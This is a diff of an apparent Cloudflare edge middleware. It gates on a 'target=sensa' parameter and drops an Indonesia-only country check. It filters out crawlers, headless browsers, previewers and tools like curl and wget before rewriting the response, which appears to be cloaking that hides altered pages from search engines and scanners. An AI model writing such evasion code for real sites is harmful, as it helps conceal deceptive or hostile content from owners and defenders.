@@ -2,13 +2,9 @@ export async function onRequest(context) {
   const { request, next } = context;
   const url = new URL(request.url);
   const userAgent = (request.headers.get('user-agent') || '').toLowerCase();
-  const country = request.cf ? request.cf.country : 'Unknown';
   const asOrganization = request.cf ? request.cf.asOrganization : '';
   const targetKey = url.searchParams.get('target');
   if (targetKey !== 'sensa') {
-    return next();
-  }
-  if (country !== 'ID') {
     return next();
   }
   const botList = /bot|spider|crawl|facebook|google|bing|slurp|yandex|adsbot|tiktok|bytedance|lighthouse|vision|petalinux|headless|linux|python|wget|curl|screenshot|preview|mediapartners|dubbin|monit/i;
@@ -31,4 +27,5 @@ export async function onRequest(context) {
     .transform(response);
 
 }
+
 
